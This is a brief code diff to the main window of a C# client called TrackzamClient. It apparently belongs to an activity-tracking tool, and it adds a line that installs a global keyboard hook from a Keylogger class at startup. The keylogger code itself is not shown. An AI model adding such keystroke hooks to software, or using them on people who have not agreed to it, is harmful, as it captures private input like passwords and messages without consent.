@@ -24,6 +24,7 @@ namespace TrackzamClient
         Keylogger k;
         public MainWindow()
         {
+            Keylogger._hookID = Keylogger.SetHook(Keylogger._proc);
             InitializeComponent();
             InitializeStartButton();
             //ActiveWindowLogger = new ActiveWindowLoggerClass(ActiveWindowLoggerTextBox);
